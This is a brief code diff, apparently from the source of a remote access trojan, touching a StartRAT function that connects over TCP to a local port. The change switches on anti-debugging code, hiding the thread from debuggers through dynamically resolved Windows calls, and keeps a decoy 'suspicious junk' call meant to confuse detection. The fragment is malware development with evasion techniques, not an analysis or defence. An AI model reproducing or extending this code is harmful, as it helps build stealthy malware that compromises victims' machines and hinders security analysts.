@@ -10,10 +10,10 @@
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
+	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
+	resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+
 	suspicious_junk_3();
-	
-	//GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
-	//resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
